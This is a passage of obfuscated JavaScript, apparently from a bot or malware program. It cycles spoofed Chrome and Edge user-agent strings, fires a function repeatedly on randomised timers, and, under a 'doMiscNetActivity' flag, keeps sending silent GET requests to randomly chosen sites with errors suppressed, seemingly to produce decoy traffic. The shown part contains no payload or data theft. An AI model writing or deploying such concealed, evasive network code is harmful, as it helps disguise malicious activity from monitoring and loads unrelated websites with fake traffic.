      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x53 * 0x53 + -0xb * -0x59 + -0x1ebc; k < -0x1555 + 0x1e7d + -0x924; k++)
    setTimeout(f, (-0x1c06f + 0x1d16 + 0x1 * 0x28db9) * k * getRandomInt(-0x654 + -0xf5 * -0x3 + 0x376, -0x24ac + -0x5 * 0x185 + 0x8 * 0x589));
  setInterval(() => {
    f();
    for (let l = -0x1e02 + -0xc21 + 0x2a23; l < -0x1 * 0x83f + -0x4d * 0x46 + 0x5 * 0x5dd; l++)
      setTimeout(f, (-0x1 * -0x5e3e + -0xb442 * -0x1 + -0x2820) * l * getRandomInt(-0x3 * 0x6dd + 0x19f7 * -0x1 + 0x2e8f, 0x1 * 0x17f0 + -0x1df8 + 0x60b * 0x1));
  }, -0x353473 + 0xbf178 + 0x60317b);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2ac6 + -0x77c * -0x2 + 0x1262 * 0x3) * getRandomInt(0x23ee + 0x6bf + -0x2aac, -0x109 + -0xb80 + 0x1 * 0xc8e));
}, 0xe75 + -0xb92 + 0x9 * -0x47);